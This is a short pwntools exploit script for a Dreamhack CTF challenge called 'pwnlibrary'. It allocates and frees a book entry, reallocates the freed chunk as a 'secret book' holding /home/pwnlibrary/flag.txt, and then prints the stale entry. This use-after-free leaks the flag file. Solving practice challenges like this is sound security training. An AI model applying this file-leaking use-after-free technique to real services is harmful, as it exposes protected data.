from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/pwnlibrary/library')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:14092'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#malloc book 0
p.recvuntil(b": ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"1")

#free book 0

p.recvuntil(b": ")
p.sendline(b"3")

#malloc secret book of size 256

p.recvuntil(b": ")
p.sendline(b"275")

p.recvuntil(b": ")
p.sendline(b"/home/pwnlibrary/flag.txt")

p.recvuntil(b": ")
p.sendline(b"256")

#print book 0
p.recvuntil(b": ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"0")

p.interactive()
